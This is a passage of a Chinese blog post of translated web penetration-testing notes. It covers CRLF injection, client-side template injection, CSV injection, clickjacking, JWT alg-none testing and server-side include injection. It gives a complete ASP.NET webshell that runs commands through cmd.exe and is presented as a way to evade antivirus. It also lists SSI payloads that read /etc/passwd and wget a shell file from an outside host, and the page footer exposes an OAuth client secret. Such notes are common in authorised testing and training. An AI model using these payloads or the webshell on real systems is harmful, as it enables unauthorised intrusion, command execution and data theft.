data:text/html%3bbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20redirect
</code></pre><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>当你看到请求的参数是这样:</p>
<pre><code>http://inj.example.org/redirect.asp?origin=foo
</code></pre><p>回显是这样：</p>
<pre><code>HTTP/1.1 302 Object moved
Date: Mon, 07 Mar 2016 17:42:46 GMT
Location: account.asp?origin=foo
Connection: close
Content-Length: 121

&lt;head&gt;&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This object may be found &lt;a HREF=&quot;&quot;&gt;here&lt;/a&gt;.&lt;/body&gt;
</code></pre><p>尝试CRLF注射：</p>
<pre><code>http://inj.example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a
CRLF： %0d%0a
https://www.gracefulsecurity.com/http-header-injection/
https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)
https://www.acunetix.com/websitesecurity/crlf-injection/
https://blog.innerht.ml/twitter-crlf-injection/
</code></pre><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>您可以将一些代码放入jsfiddle以进行payload测试：</p>
<pre><code>&lt;html&gt;
&lt;head&gt; 
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div ng-app&gt;
{{constructor.constructor('alert(1)')()}}
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>使用WEBSHEL​​L上传（.NET）绕过AV：<br>这是一个示例，其中包含fuzzdb项目中的一个webshel​​l：</p>
<pre><code>&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;
&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;
&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;
&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;
void Page_Load(object sender, EventArgs e)
{
}
string executeIt(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = &quot;cmd.exe&quot;;
psi.Arguments = &quot;/c &quot;+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdClick(object sender, System.EventArgs e)
{
Response.Write(&quot;&lt;pre&gt;&quot;);
Response.Write(Server.HtmlEncode(executeIt(txtArg.Text)));
Response.Write(&quot;&lt;/pre&gt;&quot;);
}
&lt;/script&gt;
&lt;HTML&gt;
&lt;HEAD&gt;
&lt;title&gt;REALLY NICE&lt;/title&gt;
&lt;/HEAD&gt;
&lt;body &gt;
&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;
&lt;asp:TextBox id=&quot;txtArg&quot; style=&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;
&lt;asp:Button id=&quot;testing&quot; style=&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&quot; runat=&quot;server&quot; Text=&quot;execute&quot; OnClick=&quot;cmdClick&quot;&gt;&lt;/asp:Button&gt;
&lt;asp:Label id=&quot;lblText&quot; style=&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/HTML&gt;
</code></pre><p><a href="https://hax365.wordpress.com/2015/12/15/easy-trick-to-upload-a-web-shell-and-bypass-av-products/" target="_blank" rel="noopener">https://hax365.wordpress.com/2015/12/15/easy-trick-to-upload-a-web-shell-and-bypass-av-products/</a></p>
<h3 id="PHP中的匿名函数RCE"><a href="#PHP中的匿名函数RCE" class="headerlink" title="PHP中的匿名函数RCE"></a>PHP中的匿名函数RCE</h3><pre><code>$inputFunc = function() use($a, $b, $c, &amp;$f){echo(exec(&#39;whoami&#39;));};
</code></pre><h3 id="PHP实验"><a href="#PHP实验" class="headerlink" title="PHP实验"></a>PHP实验</h3><p>如果您需要测试一些PHP代码，可以使用本机Web服务器来托管它：</p>
<pre><code>php -S 127.0.0.1:80 -t .
</code></pre><h3 id="PHP交互式SHELL"><a href="#PHP交互式SHELL" class="headerlink" title="PHP交互式SHELL"></a>PHP交互式SHELL</h3><pre><code>php -a
</code></pre><h3 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a>CSV注入</h3><p>在Windows上的Excel中，输入以下内容以获取cmd shell：</p>
<pre><code>=cmd|&#39;cmd&#39;!&#39;&#39;
</code></pre><p>exmaple:<a href="https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/" target="_blank" rel="noopener">https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/</a></p>
<p>movie：<a href="https://www.youtube.com/watch?v=SC7AkclnG2g" target="_blank" rel="noopener">https://www.youtube.com/watch?v=SC7AkclnG2g</a></p>
<h3 id="有用的脚本"><a href="#有用的脚本" class="headerlink" title="有用的脚本"></a>有用的脚本</h3><p>不断检查网站服务是否关闭：</p>
<pre><code>while true; do /usr/bin/wget &quot;http://[target]/uri/path&quot; --timeout 30 -O - 2&gt;/dev/null | grep &quot;[item on page]&quot; || echo &quot;The site is down&quot;; sleep 10; done
</code></pre><h3 id="IDORS"><a href="#IDORS" class="headerlink" title="IDORS"></a>IDORS</h3><p><a href="https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/" target="_blank" rel="noopener">https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/</a></p>
<h3 id="服务器端包含注入"><a href="#服务器端包含注入" class="headerlink" title="服务器端包含注入"></a>服务器端包含注入</h3><p>把它放在一个易受攻击的参数中：<br>如果有效，您应该在响应中看到当前日期和时间输出。</p>
<p><code>&lt;!--#printenv --&gt;</code>：输出环境变量。</p>
<pre><code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;
</code></pre><p>more:</p>
<pre><code>&lt;pre&gt;&lt;!--#exec cmd=&quot;ls&quot; --&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt; &lt;/pre&gt;
&lt;pre&gt;&lt;!--#exec cmd=&quot;whoami&quot;--&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;!--#exec cmd=&quot;dir&quot; --&gt;&lt;/pre&gt;
&lt;!--#exec cmd=&quot;ls&quot; --&gt;
&lt;!--#exec cmd=&quot;wget http://website.com/dir/shell.txt&quot; --&gt;
&lt;!--#exec cmd=&quot;/bin/ls /&quot; --&gt;
&lt;!--#exec cmd=&quot;dir&quot; --&gt;
&lt;!--#exec cmd=&quot;cd C:\WINDOWS\System32&quot;&gt;
&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;
&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;
&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;
&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;
&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;
&lt;!--#include file=?UUUUUUUU...UU?--&gt;
&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt; 
&lt;!--#exec cmd=&quot;whoami&quot;--&gt; 
&lt;!--#printenv --&gt;
&lt;!--#flastmod virtual=&quot;echo.html&quot; --&gt;
&lt;!--#echo var=&quot;auth_type&quot; --&gt;
&lt;!--#echo var=&quot;http_referer&quot; --&gt;
&lt;!--#echo var=&quot;content_length&quot; --&gt;
&lt;!--#echo var=&quot;content_type&quot; --&gt;
&lt;!--#echo var=&quot;http_accept_encoding&quot; --&gt;
&lt;!--#echo var=&quot;forwarded&quot; --&gt;
&lt;!--#echo var=&quot;document_uri&quot; --&gt;
&lt;!--#echo var=&quot;date_gmt&quot; --&gt;
&lt;!--#echo var=&quot;date_local&quot; --&gt;
&lt;!--#echo var=&quot;document_name&quot; --&gt;
&lt;!--#echo var=&quot;document_root&quot; --&gt;
&lt;!--#echo var=&quot;from&quot; --&gt;
&lt;!--#echo var=&quot;gateway_interface&quot; --&gt;
&lt;!--#echo var=&quot;http_accept&quot; --&gt;
&lt;!--#echo var=&quot;http_accept_charset&quot; --&gt;
&lt;!--#echo var=&quot;http_accept_language&quot; --&gt;
&lt;!--#echo var=&quot;http_connection&quot; --&gt;
&lt;!--#echo var=&quot;http_cookie&quot; --&gt;
&lt;!--#echo var=&quot;http_form&quot; --&gt;
&lt;!--#echo var=&quot;http_host&quot; --&gt;
&lt;!--#echo var=&quot;user_name&quot; --&gt;
&lt;!--#echo var=&quot;unique_id&quot; --&gt;
&lt;!--#echo var=&quot;tz&quot; --&gt;
&lt;!--#echo var=&quot;total_hits&quot; --&gt;
&lt;!--#echo var=&quot;server_software&quot; --&gt;
&lt;!--#echo var=&quot;server_protocol&quot; --&gt;
&lt;!--#echo var=&quot;server_port&quot; --&gt;
&lt;!--#echo var=&quot;server_name --&gt;
&lt;!--#echo var=&quot;server_addr&quot; --&gt;
&lt;!--#echo var=&quot;server_admin&quot; --&gt;
&lt;!--#echo var=&quot;script_url&quot; --&gt;
&lt;!--#echo var=&quot;script_uri&quot; --&gt;
&lt;!--#echo var=&quot;script_name&quot; --&gt;
&lt;!--#echo var=&quot;script_filename&quot; --&gt;
&lt;!--#echo var=&quot;netsite_root&quot; --&gt;
&lt;!--#echo var=&quot;site_htmlroot&quot; --&gt;
&lt;!--#echo var=&quot;path_translated&quot; --&gt;
&lt;!--#echo var=&quot;path_info_translated&quot; --&gt;
&lt;!--#echo var=&quot;request_uri&quot; --&gt;
&lt;!--#echo var=&quot;request_method&quot; --&gt;    
&lt;!--#echo var=&quot;remote_user&quot; --&gt;
&lt;!--#echo var=&quot;remote_addr&quot; --&gt;
&lt;!--#echo var=&quot;http_client_ip&quot; --&gt;
&lt;!--#echo var=&quot;remote_port&quot; --&gt;
&lt;!--#echo var=&quot;remote_ident&quot; --&gt;
&lt;!--#echo var=&quot;remote_host&quot; --&gt;
&lt;!--#echo var=&quot;query_string_unescaped&quot; --&gt;
&lt;!--#echo var=&quot;query_string&quot; --&gt;
&lt;!--#echo var=&quot;path_translated&quot; --&gt;
&lt;!--#echo var=&quot;path_info&quot; --&gt;
&lt;!--#echo var=&quot;path&quot; --&gt;
&lt;!--#echo var=&quot;page_count&quot; --&gt;
&lt;!--#echo var=&quot;last_modified&quot; --&gt;
&lt;!--#echo var=&quot;http_user_agent&quot; --&gt;
&lt;!--#echo var=&quot;http_ua_os&quot; --&gt;
&lt;!--#echo var=&quot;http_ua_cpu&quot; --&gt;
</code></pre><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><p>只需使用Burp的clickbandit。还要记住：Clickjacking适用于点击，而不适用于键盘。</p>
<p>poc:</p>
<pre><code>&lt;html&gt;
   &lt;head&gt;
 &lt;title&gt;Clickjack test page&lt;/title&gt;
   &lt;/head&gt;
   &lt;body&gt;
 &lt;p&gt;Website is vulnerable to clickjacking!&lt;/p&gt;
 &lt;iframe src=&quot;http://target.com&quot; width=&quot;500&quot; height=&quot;500&quot;&gt;&lt;/iframe&gt;
   &lt;/body&gt;
&lt;/html&gt;
</code></pre><p><a href="https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009)</a><br><a href="https://javascript.info/clickjacking" target="_blank" rel="noopener">https://javascript.info/clickjacking</a><br><a href="https://www.tinfoilsecurity.com/blog/what-is-clickjacking" target="_blank" rel="noopener">https://www.tinfoilsecurity.com/blog/what-is-clickjacking</a></p>
<h3 id="攻击JSON"><a href="#攻击JSON" class="headerlink" title="攻击JSON"></a>攻击JSON</h3><p>利用burp标记参数进行主动扫描</p>
<p><a href="https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/the-right-way-to-test-json-parameters-with-burp" target="_blank" rel="noopener">https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/the-right-way-to-test-json-parameters-with-burp</a></p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p><a href="https://www.nc-lp.com/blog/weaponize-oracle-weblogic-server-poc-cve-2018-2628" target="_blank" rel="noopener">Writeup on Oracle Weblogic CVE-2018-2628</a></p>
<p><a href="https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae" target="_blank" rel="noopener">Java Deserialization Scanner Burp Extension</a></p>
<p><a href="https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f" target="_blank" rel="noopener">Java Serialized Payloads Burp Extension</a></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/summitt/burp-ysoserial/releases" target="_blank" rel="noopener">Ysoserial</a></p>
<h3 id="测试不安全的JWT"><a href="#测试不安全的JWT" class="headerlink" title="测试不安全的JWT"></a>测试不安全的JWT</h3><pre><code>1. 获取JSON Web Tokens Burp扩展
1. 捕获请求，将其发送到Repeater
1. 单击JSON Web Tokens选项卡
1. 单击使用随机密钥对签名
1. 单击Alg None Attack下的下拉菜单
1. 单击Go
1. 查看会话后是否仍然有效
</code></pre><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p><a href="https://hack-ed.net/2017/11/05/finally-a-bug-bounty-write-up-lfi/" target="_blank" rel="noopener">https://hack-ed.net/2017/11/05/finally-a-bug-bounty-write-up-lfi/</a></p>
<h3 id="子域名探测技术"><a href="#子域名探测技术" class="headerlink" title="子域名探测技术"></a>子域名探测技术</h3><p><a href="https://0xpatrik.com/subdomain-takeover-starbucks/" target="_blank" rel="noopener">https://0xpatrik.com/subdomain-takeover-starbucks/</a></p>
<p>原文地址：<a href="https://techvomit.net/web-application-penetration-testing-notes/" target="_blank" rel="noopener">https://techvomit.net/web-application-penetration-testing-notes/</a></p>

					
				</div>
			</div>
		</article>

		<ul class="am-pagination">
    
    	<li class="am-pagination-prev">
   		<a class="pull-left" href="/2019/03/21/SRC漏洞挖掘经验+技巧篇/" title="SRC漏洞挖掘经验+技巧篇">
      		&laquo; 上一篇
		</a>
		</li>
	
	
		<li class="am-pagination-next">
		<a class="pull-right" href="/2019/03/21/从RCE到LDAP访问/" title="从RCE到LDAP访问">
			下一篇 &raquo;
		</a>
		</li>
	 
 </ul>
        

		<div class="theme-annie-comment-button-container">
	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
		加载评论
		<!--加载评论-->
	</button>
</div>

<div id="annie-comment-container" class="theme-annie-comment-main-container">

	
		
			<!-- comment gitalk -->
			<!-- show gitalk comment -->

  <div id="gitalk-container"></div>


<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">
	//thanks O-R
	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
	//去除尾部匹配正则数组的字符串  
	//remove redundant characters
	String.prototype.trimEnd = function(regStr) {
		var result = this;
		if(regStr == undefined || regStr == null || regStr == "") {
			return result;
		}
		var array = regStr.split(',');

		if(array.length > 0) {

			var c = array.shift();
			var str = this;
			var i = str.length;
			var rg = new RegExp(c);
			var matchArr = str.match(rg);

			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
				matchStr = matchStr + '$';
				result = str.replace(new RegExp(matchStr), "");
			}

			if(array.length > 0) {
				return result.trimEnd(array.join())
			} else {
				return result;
			}
		}
	};

	//create gitalk
	var gitalk = new Gitalk({
		clientID: '74a83cc9b15a1cf53e10',
		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
		//id: window.location.pathname,
		// id: (window.location.pathname).split("/").pop().substring(0, 49),
		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
		repo: 'Annie-Gitalk',
		owner: 'miraitowa',
		admin: 'miraitowa',
		distractionFreeMode: 'true',
	})
	gitalk.render('gitalk-container');
</script>
		
	

</div>

<script type="text/javascript">
	/* Show Comment */
	var Annie_Comment = function() {
		function Show_Hidden(obj) {
			obj.style.display = 'block';
		}
		
		//var obutton = $('#annie-comment-button');
		//var obutton = $('#annie-comment-container');
		var obutton = document.getElementById("annie-comment-button" || "0");
		var odiv = document.getElementById("annie-comment-container");
		if( 'obutton' ) {
			obutton.onclick = function() {
				Show_Hidden(odiv);
				$("#annie-comment-button").css("display", 'none');
				return false;
			}
		}
	};

	(function Annie_Init() {
		Annie_Comment();
	})();
</script>
		
		<!--
	时间：2018-09-24
	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
-->

	
		<aside class="post-widget">
			<nav class="post-toc-wrap" id="post-toc">
				
					<strong>文章目录</strong>
				
				
				<!--toc(post.content)-->
				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web-Fuzz"><span class="post-toc-text">Web Fuzz</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XXE"><span class="post-toc-text">XXE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#测试方法"><span class="post-toc-text">测试方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#webgoat8"><span class="post-toc-text">webgoat8</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#测试方法-1"><span class="post-toc-text">测试方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#OUT-OF-BAND"><span class="post-toc-text">OUT OF BAND</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基础测试"><span class="post-toc-text">基础测试</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#读文件"><span class="post-toc-text">读文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XSS"><span class="post-toc-text">XSS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#文件上传的XSS"><span class="post-toc-text">文件上传的XSS</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#SVG"><span class="post-toc-text">SVG</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XML"><span class="post-toc-text">XML</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#CSP-BYPASS"><span class="post-toc-text">CSP BYPASS</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#常用的payload"><span class="post-toc-text">常用的payload</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#AUTH-CRED"><span class="post-toc-text">AUTH CRED</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#偷Cookie"><span class="post-toc-text">偷Cookie</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#测试session劫持"><span class="post-toc-text">测试session劫持</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#FILTER-BYPASS-RESOURCES"><span class="post-toc-text">FILTER BYPASS RESOURCES</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基于POST的XSS"><span class="post-toc-text">基于POST的XSS</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#DOM-XSS"><span class="post-toc-text">DOM XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SSRF"><span class="post-toc-text">SSRF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQL注入"><span class="post-toc-text">SQL注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#会话固定"><span class="post-toc-text">会话固定</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CSRF"><span class="post-toc-text">CSRF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#CSRF-TO-REDECT-XSS"><span class="post-toc-text">CSRF TO REDECT XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件上传漏洞"><span class="post-toc-text">文件上传漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#无限制的文件上传"><span class="post-toc-text">无限制的文件上传</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#CORS配置错误"><span class="post-toc-text">CORS配置错误</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#测试心脏出血漏洞"><span class="post-toc-text">测试心脏出血漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#偷私钥"><span class="post-toc-text">偷私钥</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#重定向"><span class="post-toc-text">重定向</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CRLF注入"><span class="post-toc-text">CRLF注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#模板注入"><span class="post-toc-text">模板注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RCE"><span class="post-toc-text">RCE</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP中的匿名函数RCE"><span class="post-toc-text">PHP中的匿名函数RCE</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP实验"><span class="post-toc-text">PHP实验</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP交互式SHELL"><span class="post-toc-text">PHP交互式SHELL</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CSV注入"><span class="post-toc-text">CSV注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#有用的脚本"><span class="post-toc-text">有用的脚本</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IDORS"><span class="post-toc-text">IDORS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#服务器端包含注入"><span class="post-toc-text">服务器端包含注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#点击劫持"><span class="post-toc-text">点击劫持</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#攻击JSON"><span class="post-toc-text">攻击JSON</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反序列化漏洞"><span class="post-toc-text">反序列化漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#工具"><span class="post-toc-text">工具</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#测试不安全的JWT"><span class="post-toc-text">测试不安全的JWT</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LFI"><span class="post-toc-text">LFI</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#子域名探测技术"><span class="post-toc-text">子域名探测技术</span></a></li></ol></li></ol>
			</nav>
			<div class="post-toc-bar"><div>
		</div></div></aside>
	

	</div>
</div>
		</div>
		</main>
		
		<!--footer-->
		<footer>
	<div class="blog-text-center">
		<div class="theme-annie-social">
				
				
					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
					
				
				
					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
					
					
						
				
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			
				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
			
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
		</div>
	</div>
</footer>
		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->

<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>

<style>
	.motto {
		color: #000000;
		font-size: 20px;
		margin: 100px 25% 0;
		width: 50%;
		line-height: 1.4;
		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
		text-align: center;
	}
	@media(max-width: 890px) {
		.motto {	
			margin: 100px 10% 0;
			width: 80%;
		}
	}
	@media(max-width: 890px) {
		.motto {
			margin: 100px 5% 0;
			width: 90%;
		}
	}
</style>


	<script src="/js/motto.js"></script>
	<script type="text/javascript">
		$(".motto").html(getMingYanContent());
	</script>	







	<script type="text/javascript" src="/js/toc.js"></script>


<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript">
	//generate a random img that pre_name 'from 0 to 110'
	var random_bg = Math.floor(Math.random() * 109 + 1);

	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';

	$("#header-bg-2").css("background-image", bg);
</script>
		
		<!--back to top-->
        <style type="text/css">
	#totop {
		background: white;
		border-radius: 50%;
		position: fixed;
		right: 5.4%;
		bottom: 80px;
		cursor: pointer;
	}
	
	#totop a {
		color: #474747;
		background-color: transparent;
		padding: 10px;
		text-decoration: none;
	}
	
	@media(max-width:512px) {
		#totop {
			display: none;
			visibility: hidden;
		}
	}
</style>


	<div id="totop">
  		<a href="javascript:;" class="fa fa-arrow-up"></a>
	</div>

	</body>
	</html>

